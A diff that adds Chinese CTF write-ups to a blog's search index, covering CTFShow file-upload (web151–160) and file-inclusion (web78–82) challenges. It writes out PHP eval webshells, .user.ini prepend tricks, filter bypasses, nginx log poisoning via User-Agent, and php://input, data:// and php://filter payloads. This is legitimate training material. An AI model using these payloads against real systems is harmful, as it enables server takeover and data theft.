@@ -1,6 +1,302 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>CTFShow-文件上传</title>
+    <url>/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
+    <content><![CDATA[<h1 id="CTFShow-文件上传"><a href="#CTFShow-文件上传" class="headerlink" title="CTFShow 文件上传"></a>CTFShow 文件上传</h1><h2 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h2><span id="more"></span>
+
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151.png"></p>
+<p>先来上传一张正常图片发现不能上传jpg格式，可以上传png格式.并返回了上传路径: /upload/2.png</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_1.png"></p>
+<p>使用 Burp 抓包将一句话图片更改后缀为.php ,并成功返回了上传路径 /upload/yjh.php</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_2.png"></p>
+<p>蚁剑连接。</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_3.png"></p>
+<p>成功在上一级目录中找到了flag<br><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_4.png"></p>
+<p>也可以不用蚁剑，直接访问上传的文件，并post 传入 一句话木马的密码=你想构造的语句。</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_5.png"></p>
+<h2 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h2><p>后端校验要严密</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web152.png"></p>
+<p>上传图片马:<?php eval($_POST[mm]);?> 并抓包修改后缀</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web152_1.png"></p>
+<p>可见上传成功，似乎和web151一样，蚁剑连接或访问试试</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web152_2.png"></p>
+<p>当前目录没有，再试试上一级目录。</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web152_3.png"></p>
+<p>还是在上一级目录。</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web152_4.png"></p>
+<h2 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h2><p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153.png"></p>
+<p>仍然一样的页面</p>
+<p>继续web152的套路试试</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_1.png"></p>
+<p>显示内容为 文件类型不和规，那肯定是对写入的内容进行了过滤。但是不知道过滤了哪些内容。</p>
+<p>这题涉及到了一个新的内容： .user.ini 文件：简单来说是用户对环境的配置文件。</p>
+<p>先上传 .user.ini.png 文件，抓包删除.png后缀</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a <span class="comment">// 文件格式，告知系统这是 GIF89a格式生成图形</span></span><br><span class="line">auto_prepend_file=yjh.png <span class="comment">// 要执行的文件名称,将yjh.png当作Php 执行</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_2.png"></p>
+<p>再上传 yjh.png木马</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_3.png"></p>
+<p>访问 /upload/index.php 文件</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_4.png"></p>
+<h2 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h2><p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web154.png"></p>
+<p>仍然一样的页面</p>
+<p>注意和前面一样需要上传  .user.ini 文件才能将 png解析为 php 文件。</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_2.png"></p>
+<p>上传一个图片马 yjh.png : </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[mm])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web154_1.png"></p>
+<p>页面显示：文件上传失败，失败原因：文件内容不合规。</p>
+<p>那么可能对文件内容做了过滤，试试PHP短标签，php有很多短标签但是只有 </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>(xxx)<span class="meta">?&gt;</span>  = <span class="meta">&lt;?php</span> <span class="keyword">echo</span> (xxx)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p> 这种形式的使用不受PHP配置的限制，其它几种形式需要PHP开启什么什么才能，不作展示，记不到了。我建议以后直接写这种短标签的形式。</p>
+<p>修改 yjh.png 的内容为:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_post</span>[mm]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>此时修改后的上传成功，并成功返回上传路径。</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web154_2.png"></p>
+<h2 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h2><p>上传界面仍然一样！</p>
+<p>继续web154得套路试试:</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_2.png"></p>
+<p>先上传 .user.ini 文件 再上传 yjh.png</p>
+<p>yjh.png : </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[mm]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web155.png"></p>
+<p>上传成功！蚁剑连接或者 访问 /upload/index.php 文件</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_1.png"></p>
+<h2 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h2><p>上传界面仍然一样！</p>
+<p>继续web154得套路试试:</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_2.png"></p>
+<p>先上传 .user.ini 文件 再上传 yjh.png</p>
+<p>yjh.png : </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[mm]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web156.png"></p>
+<p>哦豁，文件内心不合规，看来又是对什么字符进行了过滤。试试之后发现 把 中括号 [] 给干没了，换成大括号 {}</p>
+<p>yjh.png</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>&#123;mm&#125;);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web156_1.png"></p>
+<p>上传成功！蚁剑连接或者 访问 /upload/index.php 文件</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web156_2.png"></p>
+<h2 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h2><p>继续之前得套路先上传 .user.ini 文件，再传一句话又过滤了其他字符，那就不要一句话，直接 tac ../*</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>system(<span class="string">&#x27;tac ../*&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web157.png"></p>
+<p>访问 /upload/index.php 文件</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web157_1.png"></p>
+<p>如图得到 flag, 同时 第二个红框 也显示出了过滤了哪些字符：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> !preg_match(<span class="string">&#x27;/php|\&#123;|\[|\;/i&#x27;</span>, <span class="variable">$str</span>);</span><br></pre></td></tr></table></figure>
+
+<h2 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h2><p>完全可以使用 web157中的方法得到 flag</p>
+<p>最后得到过滤了 :</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !preg_match(<span class="string">&#x27;/php|\&#123;|\[|\;|log/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h2><p>仍然和之前先上传 .user.ini 再上传yjh.png</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>system(<span class="string">&#x27;cat ../*&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>此时显示 上传类型不合规，在上一题知道 过滤了 php, {, [, ;, log 那这里可能过滤了 system函数，换成其他试试：passthru, passthru也不对，那可能把小括号过滤了。</p>
+<p>可以使用 反引号 `` PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回, 反引号与 shell_exec()函数功能一样。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>`nl ..<span class="comment">/*`?&gt;</span></span><br><span class="line"><span class="comment">// tac, cat ,nl, less, 等等</span></span><br><span class="line"><span class="comment">// nl 需要查看源代码</span></span><br></pre></td></tr></table></figure>
+
+<p>访问 /upload/index.php</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web159.png"></p>
+<p>页面最后可以看到确实过滤了小括号 (</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web159_1.png"></p>
+<h2 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h2><p>继续使用 web159中 的方法失败，显示 文件类型不合规</p>
+<p>这又不知道过滤了些什么东东。难搞。不查不知道，一查居然用nginx的日志包含来读取flag</p>
+<p>首先还是先上传 .user.ini 文件，方法内容不变。</p>
+<p>再上传 yjh.png: </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">include</span><span class="string">&quot;/var/lo&quot;</span>.g.<span class="string">&quot;/nginx/access.lo&quot;</span>.<span class="string">&quot;g&quot;</span><span class="meta">?&gt;</span> <span class="comment">// log 被过滤了，用 . （点号）拼接</span></span><br></pre></td></tr></table></figure>
+
+<p>访问 /upload/index.php 将得到 服务器日志信息:</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web160.png"></p>
+<p>日志成功读取了，接下来 修改 User-Agent的内容为:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&quot;tac ../*&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>修改 User-Agent：为 php 代码，再访问日志将会执行这行代码!</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web160_1.png"></p>
+<p>如图在网页根目录下修改，再访问 upload/index.php</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web160_2.png"></p>
+<p>如图得到 flag, 来看看到底过滤了什么内容:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> !preg_match(<span class="string">&#x27;/php|\&#123;|\[|\;|log|\(| |\`/i&#x27;</span>, <span class="variable">$str</span>);</span><br></pre></td></tr></table></figure>
+
+<p>也就多过滤了空格，反引号，所以，通过日志的方式前面集体应该也可以成功，所以，这种方法要记住！</p>
+]]></content>
+      <categories>
+        <category>CTF笔记</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>CTFShow 文件包含笔记</title>
+    <url>/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h1 id="CTFShow-文件包含笔记"><a href="#CTFShow-文件包含笔记" class="headerlink" title="CTFShow 文件包含笔记"></a>CTFShow 文件包含笔记</h1><h2 id="web78——文件包含——php伪协议"><a href="#web78——文件包含——php伪协议" class="headerlink" title="web78——文件包含——php伪协议"></a>web78——文件包含——php伪协议</h2><p>源码:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p><strong>方法一：</strong></p>
+<ol>
+<li>尝试是否可以查看 /etc/passwd中的内容: 发现可以查看</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web78.png"></p>
+<ol start="2">
+<li>尝试使用 php://input 协议:</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="comment">//input</span></span><br><span class="line">post:</span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&quot;ls&quot;</span>);<span class="meta">?&gt;</span> / <span class="meta">&lt;?php</span> system(<span class="string">&quot;tac flag.php&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web78_1.png"></p>
+<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web78_2.png"></p>
+<p><strong>方法二：</strong></p>
+<pre><code> 1. 尝试使用 php://filter/read=convert.base64-encode/resource=flag.php
+</code></pre>
+<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web78_3.png"></p>
+<p>​    base64解码:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 10:55:11</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 10:55:20</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;ctfshow&#123;db4b1df7-****-4633-ac61-717d14afa306&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>​    得到了 flag.</p>
+<h2 id="web79——文件包含"><a href="#web79——文件包含" class="headerlink" title="web79——文件包含"></a>web79——文件包含</h2><p>源码:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:10:14</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 11:12:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>首先发现题目 使用 str_replace 将php替换为了 ???</p>
+<p><strong>方法一：</strong></p>
+<pre><code> 1. 使用 大写 绕过:
+</code></pre>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=pHp:<span class="comment">//input</span></span><br><span class="line">post:</span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&quot;ls&quot;</span>);<span class="meta">?&gt;</span> / <span class="meta">&lt;?php</span> system(<span class="string">&quot;tac flag.php&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web79.png"></p>
+<p><strong>方法二：</strong></p>
+<pre><code> 1. 使用 mv 命令 将 flag.php 重命名为 a.txt
+</code></pre>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=pHp:<span class="comment">//input</span></span><br><span class="line">post:</span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&quot;mv flag.php a.txt&quot;</span>);<span class="meta">?&gt;</span> / <span class="meta">&lt;?php</span> system(<span class="string">&#x27;ls&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<pre><code> 2. 查看 a.txt 
+</code></pre>
+<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web79_2.png"></p>
+<p><strong>方法三：</strong></p>
+<ol>
+<li>使用 data:// 协议:</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 未使用 base64 编码</span></span><br><span class="line">?file=data:<span class="comment">//text/plain,<span class="meta">&lt;?pHp</span> system(&quot;tac f*&quot;);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="comment">// 使用 base64 编码 </span></span><br><span class="line"><span class="comment">// <span class="meta">&lt;?php</span> system(&#x27;tac flag.php&#x27;); = base64 = PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==</span></span><br><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web79_1.png"></p>
+<h2 id="web80——文件包含——日志shell"><a href="#web80——文件包含——日志shell" class="headerlink" title="web80——文件包含——日志shell"></a>web80——文件包含——日志shell</h2><p>源码:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 11:26:29</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>过滤了 php 和 data:</p>
+<p><strong>方法一：</strong></p>
+<pre><code> 1. 尝试使用 php://input：
+</code></pre>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=pHp:<span class="comment">//input</span></span><br><span class="line">post：</span><br><span class="line">   	<span class="meta">&lt;?php</span> system(<span class="string">&#x27;ls&#x27;</span>);<span class="meta">?&gt;</span> / <span class="meta">&lt;?php</span> system(<span class="string">&#x27;tac fl0g.php&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web80.png"></p>
+<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web81_1.png"></p>
+<pre><code> 2. 尝试使用 data:// 协议并 大写 DATA:// 但绕过失败
+</code></pre>
+<p><strong>方法二：</strong></p>
+<pre><code> 1. 利用 日志 shell ： /var/log/nginx/access.log
+ 2. bp 中 user-agent 写入一句话
+</code></pre>
+<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web80_2.png"></p>
+<pre><code> 3. 尝试连接:
+</code></pre>
+<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web80_3.png"></p>
+<p>​    4. 查找 flag（省略）</p>
+<h2 id="web81——文件包含——日志shell"><a href="#web81——文件包含——日志shell" class="headerlink" title="web81——文件包含——日志shell"></a>web81——文件包含——日志shell</h2><p>源码:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>可以发现文中将 php/data/: 都替换为了 ???;</li>
+<li>尝试是否能查看 服务器日志: ?file=/var/log/nginx/access.log — 成功</li>
+</ol>
+<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web81.png"></p>
+<p>   3.将一句话木马 写入到 User Agent当中: HackBar/Burp:</p>
+<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web81_1.png"></p>
+<p>   4.再次查看日志，日志是否包含了 一句话: — 有</p>
+<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web81_2.png"></p>
+<p>   5.蚁剑/菜刀连接:</p>
+<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web81_3.png"></p>
+<p>   查找flag:</p>
+<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web81_4.png"></p>
+<h2 id="web82——文件包含"><a href="#web82——文件包含" class="headerlink" title="web82——文件包含"></a>web82——文件包含</h2><p>源码:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 19:34:45</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p><strong>分析：</strong></p>
+<p>把 php,data,:, . 都替换为了 ??? ; 这些协议都用不了可以考虑尝试用 session对话文件包含</p>
